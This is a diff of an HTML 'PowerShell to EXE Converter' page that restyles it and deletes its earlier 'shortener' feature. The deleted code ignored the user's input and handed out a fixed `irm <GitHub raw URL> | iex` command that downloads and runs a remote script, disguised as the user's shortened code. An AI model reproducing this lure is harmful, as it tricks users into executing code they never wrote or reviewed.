@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PowerShell Shortener & Converter</title>
+    <title>PowerShell to EXE Converter</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: #000;
+            background: linear-gradient(to right, #0f0f3d, #1a1a2e);
             color: #fff;
             display: flex;
             flex-direction: column;
@@ -22,116 +22,54 @@
         h1 {
             margin-bottom: 30px;
             font-size: 3rem;
-            color: #fff;
+            color: #00aaff;
         }
         .container {
-            background-color: #222;
-            padding: 20px;
+            background-color: #161625;
+            padding: 30px;
             border-radius: 15px;
-            box-shadow: 0 0 15px #444;
+            box-shadow: 0 0 20px #000;
             width: 90%;
             max-width: 600px;
-            margin-bottom: 20px;
         }
         textarea {
             width: 100%;
             height: 150px;
             border-radius: 10px;
-            padding: 10px;
+            padding: 15px;
             border: none;
             resize: none;
             margin-bottom: 20px;
-            background-color: #333;
-            color: #fff;
+            background-color: #222244;
+            color: #00e6e6;
+            font-size: 1rem;
         }
         button {
-            padding: 10px 20px;
-            font-size: 16px;
+            padding: 15px 30px;
+            font-size: 18px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            background-color: #fff;
-            color: #000;
+            background-color: #00aaff;
+            color: #fff;
             transition: background-color 0.3s, transform 0.2s;
         }
         button:hover {
-            background-color: #ddd;
+            background-color: #0077cc;
             transform: scale(1.05);
-        }
-        #shortened-output, #exe-output {
-            margin-top: 20px;
-            background-color: #111;
-            padding: 10px;
-            border-radius: 10px;
-            word-wrap: break-word;
-            display: inline-block;
-            font-size: 0.9rem;
-        }
-        .copy-button {
-            margin-top: 10px;
-            padding: 8px 15px;
-            font-size: 14px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            background-color: #fff;
-            color: #000;
-            transition: background-color 0.3s;
-        }
-        .copy-button:hover {
-            background-color: #ddd;
         }
     </style>
 </head>
 <body>
-
-    <h1>PowerShell Code Shortener & Converter</h1>
+    <h1>PowerShell to EXE Converter</h1>
     <div class="container">
         <textarea id="ps-code-input" placeholder="Enter your PowerShell code here..."></textarea>
-        <button onclick="generateShortCode()">Generate Short Code</button>
-        <div id="shortened-output" style="display: none;">Shortened Code will appear here...</div>
-        <button id="copy-button" class="copy-button" style="display: none;" onclick="copyShortCode()">Copy Short Code</button>
-    </div>
-
-    <div class="container">
-        <textarea id="ps2exe-code-input" placeholder="Enter your PowerShell code here to convert to EXE..."></textarea>
         <button onclick="convertToExe()">Convert to EXE</button>
-        <div id="exe-output" style="display: none;">EXE File link will appear here...</div>
     </div>
 
     <script>
-        function generateShortCode() {
-            const psCode = document.getElementById("ps-code-input").value;
-            if (!psCode.trim()) {
-                alert("Please enter valid PowerShell code.");
-                return;
-            }
-
-            // Use the GitHub raw URL for storing the script
-            const rawGithubUrl = 'https://raw.githubusercontent.com/klwb123/script/refs/heads/main/script.txt';
-            const shortenedCode = `irm '${rawGithubUrl}' | iex`;
-
-            // Display the shortened code
-            const outputElement = document.getElementById("shortened-output");
-            outputElement.textContent = shortenedCode;
-            outputElement.style.display = "block";
-
-            // Show the copy button
-            const copyButton = document.getElementById("copy-button");
-            copyButton.style.display = "block";
-        }
-
-        function copyShortCode() {
-            const shortenedCode = document.getElementById("shortened-output").textContent;
-            navigator.clipboard.writeText(shortenedCode).then(() => {
-                alert("Short code copied to clipboard!");
-            }).catch(err => {
-                console.error('Error copying to clipboard: ', err);
-            });
-        }
-
         function convertToExe() {
-            const psCode = document.getElementById("ps2exe-code-input").value;
+            const psCode = document.getElementById("ps-code-input").value;
             if (!psCode.trim()) {
                 alert("Please enter valid PowerShell code.");
                 return;
@@ -155,7 +93,7 @@
                 // Create a download link for the generated EXE file
                 const link = document.createElement('a');
                 link.href = window.URL.createObjectURL(blob);
-                link.download = 'generated_script.exe';
+                link.download = 'converted_script.exe';
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
@@ -166,6 +104,5 @@
             });
         }
     </script>
-
 </body>
 </html>
